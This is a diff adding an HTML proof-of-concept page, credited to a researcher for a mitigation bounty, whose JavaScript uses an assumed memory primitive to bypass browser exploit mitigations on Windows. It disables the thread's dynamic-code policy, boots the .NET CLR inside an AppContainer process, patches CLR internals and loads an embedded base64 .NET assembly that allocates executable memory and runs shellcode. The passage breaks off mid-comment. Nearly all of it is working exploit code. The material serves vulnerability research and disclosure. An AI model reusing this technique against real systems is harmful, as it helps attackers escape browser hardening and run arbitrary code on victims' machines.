@@ -1,0 +1,384 @@
+<html>
+<head>
+<title>Mitigation bounty PoC by @mxatone (Thomas Garnier)</title>
+<link rel="stylesheet" type="text/css" href="theme.css">
+<!-- Generic toolkit that can be used on multiple PoCs -->
+<script type="text/javascript" src="toolkit.js"></script>
+<script type="text/javascript">
+// Disable W^X for the thread
+function disable_wx(exp) {
+	var THREAD_DYNAMIC_CODE_ALLOW = 1;
+	var ThreadDynamicCodePolicy = 2;
+	var cur_thread = -2;
+	var mem = exp.allocate(0x10);
+	exp.write_uint(mem, THREAD_DYNAMIC_CODE_ALLOW);
+	var r = exp.call_function("kernelbase.dll", "SetThreadInformation",
+		cur_thread, ThreadDynamicCodePolicy, mem, 4);
+	check_eq(r, 1);
+}
+
+/*
+ * .NET payload. Basically this code:
+ * 
+ * public MyClass()
+ * {
+ * 	UIntPtr addr = VirtualAlloc(new UIntPtr(0), new UIntPtr(0x1000), AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
+ * 
+ * 	unsafe
+ * 	{
+ * 		var ptr = addr.ToPointer();
+ * 		var callback = (TestCallbackDelegate) Marshal.GetDelegateForFunctionPointer(new IntPtr(ptr), typeof(TestCallbackDelegate));
+ * 		byte* buffer = (byte*)ptr;
+ * 		int i = 0;
+ * 		buffer[i++] = (byte)0x90;
+ * 		buffer[i++] = (byte)0x90;
+ * 		buffer[i++] = (byte)0x90;
+ * 		buffer[i++] = (byte)0x90;
+ * 		buffer[i++] = (byte)0xcc;
+ * 
+ * 		callback();
+ * 	}
+ * }
+ */
+var dotnet_class = "toInject.MyClass";
+var base64_dotnet_binary = "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LgAjAC4BLgArAC4BLgBTAC4BLgALANYALgBDAC4BLgBrAHYBLgCDAIwBLgBbAEwBLgB7AIMBYwDLAFoAgwDLAFoACAAGALQBywCGBEABAwCLAAEABIAAAAEAAAAAAAAAAAAAAAAAHwAAAAQAAAAAAAAAAAAAAAEAXQAAAAAAAwACAAQAAgAFAAIAAAAAPE1vZHVsZT4AdG9JbmplY3QuZGxsAE15Q2xhc3MAdG9JbmplY3QAQWxsb2NhdGlvblR5cGUATWVtb3J5UHJvdGVjdGlvbgBUZXN0Q2FsbGJhY2tEZWxlZ2F0ZQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AEVudW0ATXVsdGljYXN0RGVsZWdhdGUAVmlydHVhbEFsbG9jAC5jdG9yAHZhbHVlX18AQ09NTUlUAFJFU0VSVkUAUkVTRVQATEFSR0VfUEFHRVMAUEhZU0lDQUwAVE9QX0RPV04AV1JJVEVfV0FUQ0gARVhFQ1VURQBFWEVDVVRFX1JFQUQARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURV9XUklURUNPUFkATk9BQ0NFU1MAUkVBRE9OTFkAUkVBRFdSSVRFAFdSSVRFQ09QWQBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNIRV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBJbnZva2UASUFzeW5jUmVzdWx0AEFzeW5jQ2FsbGJhY2sAQmVnaW5JbnZva2UARW5kSW52b2tlAGxwQWRkcmVzcwBkd1NpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAb2JqZWN0AG1ldGhvZABjYWxsYmFjawByZXN1bHQAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q3VsdHVyZUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEFzc2VtYmx5VmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAFN5c3RlbS5TZWN1cml0eS5QZXJtaXNzaW9ucwBTZWN1cml0eVBlcm1pc3Npb25BdHRyaWJ1dGUAU2VjdXJpdHlBY3Rpb24AU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAERsbEltcG9ydEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAVUludFB0cgBUb1BvaW50ZXIASW50UHRyAFR5cGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUATWFyc2hhbABEZWxlZ2F0ZQBHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcgBGbGFnc0F0dHJpYnV0ZQBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJpZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAERmazCvQOdNilmLodom8hMACLd6XFYZNOCJCQAEGRkZEQwREAMgAAECBgkDBhEMBAAQAAAEACAAAAQAAAgABAAAACAEAABAAAQAABAABAAAIAADBhEQBBAAAAAEIAAAAARAAAAABIAAAAAEAQAAAAQCAAAABAQAAAAECAAAAAQAAQAABAACAAAEAAQAAAUgAgEcGAcgAhIREhUcBSABARIRBCABAQ4EIAEBAgUgAQERUQUgAQERWQQgAQEIBCABAQkEIAAPAQUgAQEPAQYAARJxEXUHAAISfRgScQoHBRkPARIUDwUISQEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC41AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRIuTkVUIEZyYW1ld29yayA0LjUNAQAI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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA0D4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+function get_dotnet_binary() {
+	var data = window.atob(base64_dotnet_binary);
+	var ret = new Array(data.length);
+	for (var i = 0; i < data.length; i++) {
+		ret[i] = data.charCodeAt(i);
+	}
+	return ret;
+}
+
+// Find the current AppDomain in the TLS, different than the one in the classes for some reasons
+function FindAppDomainByTls(exp) {
+	var clr_ptr = exp.GetProcAddressFromPEB("clr.dll", "CorExitProcess");
+	var clr_start = exp.find_module_base(clr_ptr);
+	var clr_end = clr_start.add(exp.find_image_size(clr_start));
+	var latestTls = exp.call_function("kernelbase.dll", "TlsAlloc");
+	check_ne(latestTls, 0xFFFFFFFF);
+	latestTls = latestTls.toInt();
+	var found = new Array();
+	for (var i = 0; i < latestTls; i++) {
+		var current_tls = exp.call_function("kernelbase.dll", "TlsGetValue", i);
+		if (current_tls.lt(0x100000))  // People store ids in them ...
+			continue;
+		var vtable = exp.read_ptr(current_tls);
+		if (vtable.gt(clr_start) && vtable.lt(clr_end)) {
+			found.push(current_tls);
+		}
+	}
+	// Two TLS entries are used by CLR, always the second one
+	if (found.length == 2) {
+		return found[1];
+	}
+	throw new Error(0, "Failed to find the AppDomain TLS entry");
+}
+
+// Simple function to find relative references in module
+function search_in_module(exp, addr, size, data, module_start, module_end) {
+	var match = null;
+	if (size != 0)
+		match = exp.find_pattern_in_scope(addr, size, data);
+	if (match == null)
+		throw new Error(0, "Could not find pattern " + data);
+	var offset = exp.read_uint(match.add(data.length));
+	var va = match.add(data.length + 4).add(offset.toInt());
+	if (va.gt(module_start) && va.lt(module_end))
+		return va;
+	match = match.add(1);
+	var remaining = size - (match.sub(addr).toInt());
+	return search_in_module(exp, match.add(1), remaining, data, module_start, module_end);
+}
+
+/*
+ * Search g_pAppXRTInf by going through couple functions
+ * Ugly but seems to be the best way.
+ */
+function findAppxRtInfo(exp) {
+	var IIE_does_nothing = exp.GetProcAddressFromPEB("clr.dll", "IEE");
+	var ILocalServerLifetime = exp.allocate(0x20);
+	exp.write_ptr(ILocalServerLifetime, ILocalServerLifetime.add(8));
+	exp.write_ptr(ILocalServerLifetime.add(8), IIE_does_nothing);
+	exp.write_ptr(ILocalServerLifetime.add(16), IIE_does_nothing);
+	var ppInterface = exp.allocate(0x8);
+	var hresult = exp.call_function("clr.dll", "NGenCreateNGenWorker", ppInterface, ILocalServerLifetime, 0);
+	check_eq(hresult, 0);
+	
+	// Find CCorSvcWorker::SetPackage && AppX::SetCurrentPackageForNGen
+	var ICorSvcWorker = exp.read_ptr(ppInterface);
+	var vtable = exp.read_ptr(ICorSvcWorker.add(0x18));
+	var SetPackage = exp.read_ptr(vtable.add(0x18));
+	log("SetPackage = " + SetPackage.Stringify(16));
+	
+	var clr_start = exp.find_module_base(IIE_does_nothing);
+	var clr_end = clr_start.add(exp.find_image_size(clr_start));
+	
+	// E9 E0 7D F9 FF
+	// jmp     ?SetCurrentPackageForNGen@AppX@@YAJPEBG@Z
+	var SetCurrentPageForNGen = search_in_module(exp, SetPackage, 0x20, [0xE9], clr_start, clr_end);
+	
+	// E8 93 4D A2 FF
+	// call    sub_180006990
+	var subFunction = search_in_module(exp, SetCurrentPageForNGen, 0x50, [0xE8], clr_start, clr_end);
+	
+	// 48 8B 05 F5 97 93 00
+	// mov     rax, cs:?g_pAppXRTInfo@@3PEAUAppXRTInfo@@EA
+	return search_in_module(exp, subFunction, 0x50, [0x48, 0x8B, 0x05], clr_start, clr_end);
+}
+
+// Get ICLRMetaHost base class to interact with .NET
+function get_meta_host(exp) {
+	// Load mscoree.dll
+	var dll = exp.dup_string("mscoree.dll");
+	var hModule = exp.call_function("kernel32.dll", "GetModuleHandleA", dll);
+	
+	if (!hModule.equal(0)) {
+		log("mscoree.dll was already loaded, if the poc fail kill the process and restart");
+	}
+	hModule = exp.call_function("kernel32.dll", "LoadLibraryA", dll);
+	check_ne(hModule, 0);
+	log("hModule = " + hModule.Stringify(16));
+	
+	// Take the address to CLRCreateInstance
+	var CLRCreateInstance = exp.GetProcAddressFromPEB("mscoree.dll", "CLRCreateInstance");
+	log("CLRCreateInstance = " + CLRCreateInstance.Stringify(16));
+	
+	// Call CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, ...)
+	var CLSID_CLRMetaHost = exp.dup_GUID(0x9280188d, 0xe8e, 0x4867, [0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde]);
+	var IID_ICLRMetaHost = exp.dup_GUID(0xD332DB9E, 0xB9B3, 0x4125, [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16]);
+	var ppInterface = exp.allocate(0x8);
+	var hresult = exp.call_function_ex(CLRCreateInstance, [CLSID_CLRMetaHost, IID_ICLRMetaHost, ppInterface]);
+	check_eq(hresult, 0);
+	
+	ICLRMetaHost = exp.read_ptr(ppInterface);
+	check_ne(ICLRMetaHost, 0);
+	log("ICLRMetaHost = " + ICLRMetaHost.Stringify(16));
+	return ICLRMetaHost;
+}
+
+/*
+ * PoC 2 will load our own unsafe .NET IL code to do whatever we want.
+ * I can also instrument CLR to do that through reflection but that method is much
+ * more flexible. .NET can use DllImport to reference non-CFG functions.
+ * In theory, your full local EoP payload could just be a .NET binary...
+ */
+function poc_1() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc1 - Load unsafe .NET IL allocate RWX, jump to it");
+
+		// Disable W^X
+		disable_wx(exp);
+		
+		var ppInterface = exp.allocate(0x8);		
+		ICLRMetaHost = get_meta_host(exp);
+		
+		// Get CLR Runtime
+		var GetRuntimeIdx = 3;
+		var dotnet = exp.dup_wstring("v4.0.30319");
+		var IID_ICLRRuntimeInfo = exp.dup_GUID(0xBD39D1D2, 0xBA2F, 0x486a, [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91]);
+		hresult = exp.call_function_cpp(ICLRMetaHost, GetRuntimeIdx, dotnet, IID_ICLRRuntimeInfo, ppInterface);
+		check_eq(hresult, 0);
+		
+		var ICLRRuntimeInfo = exp.read_ptr(ppInterface);
+		check_ne(ICLRRuntimeInfo, 0);
+		log("ICLRRuntimeInfo = " + ICLRRuntimeInfo.Stringify(16));
+		
+		// Change default flag, could always help
+		var SetDefaultStartupFlagsIdx = 11;
+		hresult = exp.call_function_cpp(ICLRRuntimeInfo, SetDefaultStartupFlagsIdx, 0);
+		check_eq(hresult, 0);
+		
+		// Get the CLRRuntimeHost
+		var GetInterfaceIdx = 9;
+		var CLSID_CLRRuntimeHost = exp.dup_GUID(0x90F1A06E, 0x7712, 0x4762, [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]);
+		var IID_ICLRRuntimeHost = exp.dup_GUID(0x90F1A06C, 0x7712, 0x4762, [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]);
+		hresult = exp.call_function_cpp(ICLRRuntimeInfo, GetInterfaceIdx, CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, ppInterface);
+		check_eq(hresult, 0);
+		
+		var ICLRRuntimeHost = exp.read_ptr(ppInterface);
+		check_ne(ICLRRuntimeHost, 0);
+		log("ICLRRuntimeHost = " + ICLRRuntimeHost.Stringify(16));
+		
+		// Start the CLR runtime host, that may fail if already started
+		var StartCLRIdx = 3;
+		exp.call_function_cpp(ICLRRuntimeHost, StartCLRIdx);
+		log("CLR started");
+		
+		// Take the COR Runtime host
+		var CLSID_CorRuntimeHost = exp.dup_GUID(0xcb2f6723, 0xab3a, 0x11d2, [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e]);
+		var IID_ICorRuntimeHost = exp.dup_GUID(0xcb2f6722, 0xab3a, 0x11d2, [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e]);
+		hresult = exp.call_function_cpp(ICLRRuntimeInfo, GetInterfaceIdx, CLSID_CorRuntimeHost, IID_ICorRuntimeHost, ppInterface);
+		check_eq(hresult, 0);
+		
+		var ICorRuntimeHost = exp.read_ptr(ppInterface);
+		check_ne(ICorRuntimeHost, 0);
+		log("ICorRuntimeHost = " + ICorRuntimeHost.Stringify(16));
+		
+		// Start COR runtime
+		var StartIdx = 10;
+		hresult = exp.call_function_cpp(ICorRuntimeHost, StartIdx);
+		check_eq(hresult, 0);
+		log("Core started");
+		
+		/*
+		 * An AppContainer process is limited, lets overwrite g_pAppXRTInf+8
+		 * so CLR things we are not in AppX process. Without this the following
+		 * binder change will result in null deferences.
+		 */
+		var g_pAppXRTInf = findAppxRtInfo(exp);
+		exp.write(g_pAppXRTInf.add(8), [0], 1);
+		
+		/*
+		 * Remove the binder from the current thread TLS entry.
+		 * It is added early when CLR realize it is an AppX process. It mix-up the loading of the
+		 * assembly. There must be a more reliable way to do that, I didn't find it though.
+		 */
+		var AppDomainTlsEntry = FindAppDomainByTls(exp);
+		log("AppDomainTlsEntry = " + AppDomainTlsEntry.Stringify(16));
+		exp.write_ptr(AppDomainTlsEntry.add(0x0F48), 0);
+		
+		// Get the default domain
+		var GetDefaultDomainIdx = 13;
+		hresult = exp.call_function_cpp(ICorRuntimeHost, GetDefaultDomainIdx, ppInterface);
+		check_eq(hresult, 0);
+		
+		var IUnknown = exp.read_ptr(ppInterface);
+		check_ne(IUnknown, 0);
+		log("IUnknown = " + IUnknown.Stringify(16));
+		
+		var QueryInterfaceIdx = 0;
+		var AppDomainIID = exp.dup_GUID(0x05F696DC, 0x2B29, 0x3663, [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13]);
+		hresult = exp.call_function_cpp(IUnknown, QueryInterfaceIdx, AppDomainIID, ppInterface);
+		check_eq(hresult, 0);
+		
+		var AppDomainPtr = exp.read_ptr(ppInterface);
+		check_ne(AppDomainPtr, 0);
+		log("AppDomainPtr = " + AppDomainPtr.Stringify(16));
+		
+		// Take an array of the .NET binary we want to load
+		var dot_net_bin = get_dotnet_binary();
+		
+		// Create a SAFEARRAY representation
+		var VT_UI1 = 0x11;
+		var psa = exp.call_function("OLEAUT32.dll", "SafeArrayCreateVector", VT_UI1, 0, dot_net_bin.length);
+		check_ne(psa, 0);
+		
+		hresult = exp.call_function("OLEAUT32.dll", "SafeArrayAccessData", psa, ppInterface);
+		check_eq(hresult, 0);
+		
+		var pdata = exp.read_ptr(ppInterface);
+		check_ne(pdata, 0);
+		exp.write(pdata, dot_net_bin, dot_net_bin.length);
+		log(".NET data at = " + pdata.Stringify(16));
+		
+		hresult = exp.call_function("OLEAUT32.dll", "SafeArrayUnaccessData", psa);
+		check_eq(hresult, 0);
+		
+		// Remove principal policy
+		var SetPrincipalPolicyIdx = 67;
+		hresult = exp.call_function_cpp(AppDomainPtr, SetPrincipalPolicyIdx, 0);
+		check_eq(hresult, 0);
+
+		// Load the .NET binary stream
+		var Load_2_idx = 0x2D;
+		hresult = exp.call_function_cpp(AppDomainPtr, Load_2_idx, psa, ppInterface);
+		check_eq(hresult, 0);
+		
+		var AssemblyPtr = exp.read_ptr(ppInterface);
+		check_ne(AssemblyPtr, 0);
+		log("AssemblyPtr = " + AssemblyPtr.Stringify(16));
+		
+		/*
+		 * Create an instance of our main constructor
+		 * Will crash with dynamically generated code:
+		 * (2540.10b0): Break instruction exception - code 80000003 (first chance)
+		 * 00000257`a68f0004 cc              int     3
+		 *
+		 * 0:011> kb
+		 * 0x00000257`a68f0004
+		 * 0x00007ff9`b0f20d0d
+		 * 0x00007ff9`b0f20aa1
+		 * clr!CallDescrWorkerInternal+0x83
+		 * clr!CallDescrWorkerWithHandler+0x4e
+		 * clr!MethodDescCallSite::CallTargetWorker+0xf8
+		 * clr!IsComObjectClass+0x100
+		 * clr!IsComObjectClass+0x8a
+		 * clr!RuntimeTypeHandle::CreateInstance+0x262
+		 * mscorlib_ni+0x4c986a
+		 * mscorlib_ni+0x4c9a89
+		 * mscorlib_ni+0x521d6f
+		 * mscorlib_ni+0x521a7f
+		 * mscorlib_ni+0x56d29a
+		 * mscorlib_ni+0x588628
+		 * mscorlib_ni+0xc7874b
+		 * clr!COMToCLRDispatchHelper+0x39
+		 * clr!COMToCLRWorker+0x1b4
+		 * clr!GenericComCallStub+0x57
+		 * RPCRT4!Invoke+0x73
+		 * RPCRT4!NdrStubCall2+0x397
+		 * RPCRT4!NdrServerCall2+0x23
+		 * chakra!amd64_CallFunction+0x93
+		 *
+		 * 0:011> !CLRStack
+		 * OS Thread Id: 0x10b0 (11)
+		 *         Child SP               IP Call Site
